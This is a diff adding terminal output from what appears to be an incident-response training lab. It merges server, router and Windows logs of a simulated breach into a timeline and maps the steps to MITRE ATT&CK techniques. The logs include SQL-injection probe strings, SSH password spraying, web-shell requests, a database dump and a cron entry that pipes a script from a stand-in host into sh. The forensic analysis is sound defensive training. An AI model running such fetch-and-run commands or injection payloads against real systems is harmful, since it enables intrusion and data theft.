@@ -1,0 +1,93 @@
+$ cd s18/mau && python3 dong-thoi-gian18.py /lab/su-co18 97 2026-11-21T14:00:00Z 2026-11-23T02:10:00Z 203.0.113.5 198.51.100.77 'NOT in sudoers' docker-b0a9 apt-compat B0A903430D8B 'query[PTR] 1.0.20.10' 'DPT=445' 'DPT=3389' 'DPT=22 ' 'app=psql' 'user=postgres' 'cdn-update' | cut -c1-175
+11-21 14:48:10Z	nginx	vps01	203.0.113.50 GET /api/tours?q=da%20lat → 200 2,210 B "sqlmap/1.9.11#stable ("  [×6 tới 14:55:01]	access.log:8782
+11-21 14:48:18Z	nginx	vps01	203.0.113.50 GET /api/tours?q=1%20AND%20SLEEP(5) → 400 96 B "sqlmap/1.9.11#stable ("  [×4 tới 14:54:53]	access.log:8784
+11-21 14:48:26Z	nginx	vps01	203.0.113.50 GET /api/tours?q=%27%29%29 → 400 96 B "sqlmap/1.9.11#stable ("  [×9 tới 14:54:45]	access.log:8787
+11-21 14:48:47Z	nginx	vps01	203.0.113.50 GET /api/tours?q=%27%20OR%20%271%27%3D%271 → 400 96 B "sqlmap/1.9.11#stable ("  [×4 tới 14:52:33]	access.log:8790
+11-21 14:48:56Z	nginx	vps01	203.0.113.50 GET /api/tours?q=%27 → 400 96 B "sqlmap/1.9.11#stable ("  [×8 tới 14:53:18]	access.log:8791
+11-21 14:49:12Z	nginx	vps01	203.0.113.50 GET /api/tours?q=%27%20UNION%20SELECT%20NULL-- → 400 96 B "sqlmap/1.9.11#stable ("  [×3 tới 14:52:09]	access.log:8794
+11-21 14:49:21Z	nginx	vps01	203.0.113.50 GET /api/tours?q=da%20lat%27%20AND%201%3D2--%20- → 400 96 B "sqlmap/1.9.11#stable ("  [×4 tới 14:54:05]	access.log:8796
+11-21 14:51:18Z	nginx	vps01	203.0.113.50 GET /api/tours?q=%27%3B%20SELECT%20pg_sleep(5)-- → 400 96 B "sqlmap/1.9.11#stable ("  [×5 tới 14:53:00]	access.log:8813
+11-21 14:52:25Z	nginx	vps01	203.0.113.50 GET /api/tours?q=1)%20AND%201%3D1--%20- → 400 96 B "sqlmap/1.9.11#stable ("  [×3 tới 14:54:14]	access.log:8824
+11-21 15:03:12Z	journal!	vps01	sshd[1329426]: Invalid user admin from 203.0.113.50 port 59610  [×21 tới 15:37:07]	journal:1136
+11-21 15:03:12Z	journal!	vps01	sshd[1329426]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.50  [×21 tới 15:37:07]	journ
+11-21 15:03:14Z	journal!	vps01	sshd[1329426]: Failed password for invalid user admin from 203.0.113.50 port 59610 ssh2  [×35 tới 15:37:09]	journal:1139
+11-21 15:03:14Z	journal!	vps01	sshd[1329426]: Connection closed by invalid user admin 203.0.113.50 port 59610 [preauth]  [×21 tới 15:37:09]	journal:1140
+11-21 15:03:29Z	journal!	vps01	sshd[1329464]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.51  u  [×14 tới 15:36:12]	jo
+11-21 15:03:31Z	journal!	vps01	sshd[1329464]: Connection closed by authenticating user root 203.0.113.51 port 30194 [preauth]  [×14 tới 15:36:14]	journal:1143
+11-21 15:34:17Z	journal!	vps01	sshd[1333571]: Accepted password for deploy from 203.0.113.52 port 42179 ssh2	journal:1252
+11-21 15:34:17Z	journal!	vps01	sshd[1333571]: Disconnected from user deploy 203.0.113.52 port 42179	journal:1255
+11-21 15:34:17Z	journal!	vps01	sshd[1333571]: Received disconnect from 203.0.113.52 port 42179:11: Bye Bye	journal:1257
+11-21 15:41:07Z	journal!	vps01	sshd[1334482]: Accepted password for deploy from 198.51.100.77 port 52405 ssh2	journal:1294
+11-21 15:42:31Z	journal	vps01	sudo:   deploy : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/id	journal:1297
+11-21 15:44:30Z	journal	vps01	systemd[1]: Started docker-b0a903430d8bff87c85332b1d444d151085b39c9e599855fdefba2dd580378a9.scope - libcontainer conta	journal:1301
+11-21 15:48:01Z	journal	vps01	cron[811]: (*system*apt-compat) RELOAD (/etc/cron.d/apt-compat)	journal:1303
+11-21 15:50:01Z	journal	vps01	CRON[1335668]: (root) CMD (curl -fsS http://cdn-update.example.net/u.sh | sh >/dev/null 2>&1)  [×206 tới 02:00:01]	journal:1304
+11-21 15:52:40Z	rt01	rt01	dnsmasq[1432]: query[PTR] 1.0.20.10.in-addr.arpa from 10.8.0.1	logread:2742
+11-21 15:55:10Z	rt01	rt01	kernel: [1957390.028393] wg-lan: IN=wg0 OUT=br-lan MAC= SRC=10.8.0.1 DST=10.20.0.15 LEN=60 TOS=0x00 PREC=0x00 TTL=63 I  [×21 tới 15:58:06]	logread
+11-21 15:56:30Z	win	PC-DEV01	win 4625 TargetUserName=Administrator LogonType=3 SubStatus=0xc0000072 WorkstationName=B0A903430D8B IpAddress=10.8.0.1	security.jsonl:38
+11-21 15:56:36Z	win	PC-DEV01	win 4625 TargetUserName=admin LogonType=3 SubStatus=0xc0000064 WorkstationName=B0A903430D8B IpAddress=10.8.0.1 IpPort=	security.jsonl:39
+11-21 15:56:45Z	win	PC-DEV01	win 4625 TargetUserName=hoasen LogonType=3 SubStatus=0xc0000064 WorkstationName=B0A903430D8B IpAddress=10.8.0.1 IpPort	security.jsonl:40
+11-21 15:56:51Z	win	PC-DEV01	win 4625 TargetUserName=minh LogonType=3 SubStatus=0xc000006a WorkstationName=B0A903430D8B IpAddress=10.8.0.1 IpPort=4  [×10 tới 15:57:53]	secu
+11-21 15:57:53Z	win	PC-DEV01	win 4740 TargetUserName=minh TargetDomainName=B0A903430D8B	security.jsonl:51
+11-21 15:58:01Z	win	PC-DEV01	win 4625 TargetUserName=minh LogonType=3 WorkstationName=B0A903430D8B IpAddress=10.8.0.1 IpPort=48625 TargetDomainName  [×2 tới 15:58:06]	secur
+11-21 16:06:02Z	nginx	vps01	198.51.100.77 GET /blog/wp-content/uploads/2026/11/cache.php → 200 0 B "curl/8.5.0"	access.log:8914
+11-21 16:06:19Z	nginx	vps01	198.51.100.77 POST /blog/wp-content/uploads/2026/11/cache.php → 200 34 B "curl/8.5.0"	access.log:8916
+11-21 16:21:40Z	journal	vps01	systemd[1]: docker-b0a903430d8bff87c85332b1d444d151085b39c9e599855fdefba2dd580378a9.scope: Deactivated successfully.	journal:1320
+11-21 16:22:10Z	journal!	vps01	sshd[1334482]: Disconnected from user deploy 198.51.100.77 port 52405	journal:1322
+11-21 16:22:10Z	journal!	vps01	sshd[1334482]: Received disconnect from 198.51.100.77 port 52405:11: disconnected by user	journal:1323
+11-21 19:10:05Z	nginx	vps01	198.51.100.77 POST /blog/wp-content/uploads/2026/11/cache.php → 200 61 B "curl/8.5.0"  [×8 tới 19:31:20]	access.log:9099
+11-21 19:10:42Z	nginx	vps01	198.51.100.77 POST /blog/wp-content/uploads/2026/11/cache.php → 200 1,290 B "curl/8.5.0"	access.log:9100
+11-21 19:12:48Z	nginx-err	vps01	nginx-error [error] FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined array key "c" in /var/www/hoasen/blo	error.log:1
+11-21 19:13:39Z	pg	tour-db	pg FATAL user=postgres from=172.18.0.1:61104 app=-: password authentication failed for user "postgres"	postgresql-Sat.csv:2
+11-21 19:14:27Z	pg	tour-db	pg LOG user=tour_app from=172.18.0.1:44994 app=psql: duration: 8412.330 ms  statement: COPY (SELECT ho_ten, email, so_	postgresql-Sat.csv:6
+11-21 19:14:27Z	pg	tour-db	pg LOG user=tour_app from=172.18.0.1:44994 app=psql: disconnection: session time: 0:00:09.300 user=tour_app database=t	postgresql-Sat.csv:7
+11-21 19:19:12Z	nginx	vps01	198.51.100.77 GET /blog/wp-content/uploads/2026/11/kh.csv.gz → 200 3,486,215 B "curl/8.5.0"	access.log:9108
+11-21 19:21:40Z	nginx	vps01	198.51.100.77 GET /blog/wp-content/uploads/2026/11/kh.csv.gz → 404 153 B "curl/8.5.0"	access.log:9110
+# 443 bản ghi → 44 hàng; nguồn: journal 210, journal! 132, nginx 59, nginx-err 1, pg 3, rt01 22, win 16
+$ python3 s18/mau/dong-thoi-gian18.py su-co18 0 2026-11-21T15:00:00Z 2026-11-21T17:00:00Z 'SPT=37255 ' 'IpPort":"37255' 'IpPort=37255' | cut -f1,2,4 | cut -c1-120; python3 s18/mau/dong-thoi-gian18.py su-co18 97 2026-11-21T15:00:00Z 2026-11-21T17:00:00Z 'SPT=37255 ' 'IpPort=37255' | cut -f1,2,4 | cut -c1-120
+11-21 15:54:53Z	rt01	kernel: [1957470.000337] wg-lan: IN=wg0 OUT=br-lan MAC= SRC=10.8.0.1 DST=10.20.0.15 LEN=60 TOS=0x00
+11-21 15:56:30Z	win	win 4625 TargetUserName=Administrator LogonType=3 SubStatus=0xc0000072 WorkstationName=B0A903430D8B
+# 2 bản ghi → 2 hàng; nguồn: rt01 1, win 1
+11-21 15:56:30Z	rt01	kernel: [1957470.000337] wg-lan: IN=wg0 OUT=br-lan MAC= SRC=10.8.0.1 DST=10.20.0.15 LEN=60 TOS=0x00
+11-21 15:56:30Z	win	win 4625 TargetUserName=Administrator LogonType=3 SubStatus=0xc0000072 WorkstationName=B0A903430D8B
+# 2 bản ghi → 2 hàng; nguồn: rt01 1, win 1
+$ tail -n +2 s18/mau/attack-su-co18.tsv | awk -F'\t' '{printf "%-10s %-19s %s\n", $2, $4, $3}'
+T1595.002  Reconnaissance      Vulnerability Scanning (sqlmap vào /api/tours)
+T1110.003  Credential Access   Password Spraying (SSH, 3 IP, 12 tài khoản)
+T1078.003  Initial Access      Valid Accounts: Local Accounts (deploy)
+T1133      Initial Access      External Remote Services (SSH mật khẩu mở ra Internet)
+T1611      Privilege Escalation Escape to Host (docker run -v /:/host)
+T1053.003  Persistence         Scheduled Task/Job: Cron
+T1036.005  Stealth             Match Legitimate Resource Name or Location (apt-compat)
+T1105      Command and Control Ingress Tool Transfer (curl … | sh mỗi 10 phút)
+T1018      Discovery           Remote System Discovery (DNS ngược cả /24)
+T1046      Discovery           Network Service Discovery (SYN 445/3389/22)
+T1110.001  Credential Access   Password Guessing (SMB vào PC-DEV01)
+T1505.003  Persistence         Web Shell (cache.php)
+T1070.006  Stealth             Timestomp (mtime 02/11, Birth 21/11)
+T1685.006  Defense Impairment  Clear Linux or Mac System Logs (sed -i auth.log)
+T1552.001  Credential Access   Credentials In Files (.env đọc được bởi mọi người)
+T1213.006  Collection          Data from Information Repositories: Databases (COPY khach_hang)
+T1560.001  Collection          Archive via Utility (kh.csv.gz)
+T1041      Exfiltration        Exfiltration Over C2 Channel (tải qua chính web server)
+T1070.004  Stealth             File Deletion (kh.csv.gz 404 sau đó)
+$ tail -n +2 s18/mau/attack-su-co18.tsv | while IFS="$(printf '\t')" read -r b k ten ct tep mau; do printf '%-10s %4s  %s\n' "$k" "$(grep -cE -- "$mau" "su-co18/$tep")" "$tep"; done
+T1595.002    46  vps01/var/log/nginx/access.log
+T1110.003    35  vps01/journal/vps01-journal.json
+T1078.003     2  vps01/journal/vps01-journal.json
+T1133         1  vps01/thu-thap/sshd-T.txt
+T1611         1  vps01/journal/vps01-journal.json
+T1053.003     1  vps01/var/log/syslog.1
+T1036.005     2  vps01/thu-thap/cron.d.txt
+T1105       198  vps01/var/log/syslog
+T1018       254  rt01/logread.txt
+T1046        21  rt01/logread.txt
+T1110.001    15  pc-dev01/security.jsonl
+T1505.003    11  vps01/var/log/nginx/access.log
+T1070.006     1  vps01/thu-thap/stat.txt
+T1685.006     1  vps01/thu-thap/stat.txt
+T1552.001     1  vps01/thu-thap/env.txt
+T1213.006     1  vps01/postgresql/log/postgresql-Sat.csv
+T1560.001     2  vps01/var/log/nginx/access.log
+T1041         1  vps01/var/log/nginx/access.log
+T1070.004     1  vps01/var/log/nginx/access.log
